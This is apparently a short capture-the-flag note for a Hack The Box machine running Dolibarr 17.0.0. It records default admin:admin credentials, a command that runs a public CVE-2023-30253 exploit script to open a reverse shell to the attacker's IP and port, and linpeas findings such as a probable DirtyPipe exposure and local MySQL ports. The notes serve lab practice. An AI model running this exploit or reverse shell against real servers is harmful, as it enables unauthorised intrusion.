Apache/2.4.41

![[Pasted image 20240914093128.png]]

`[Dolibarr 17.0.0](https://www.dolibarr.org)`

![[Pasted image 20240914093237.png]]

Login web-app:

admin:admin

Exploit for reverse shell

```php
python3 pwn.py http://crm.board.htb admin admin 10.10.14.19 6667
```

https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253?tab=readme-ov-file

**Linpeas**

OS: Linux version 5.15.0-107-generic

Sudo version 1.8.31

Details: https://dirtypipe.cm4all.com/
   Exposure: probable

127.0.0.1:33060
127.0.0.1:3306

larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash

/etc/apache2/sites-available/000-default.conf

https://wiki.dolibarr.org/index.php?title=Configuration_file


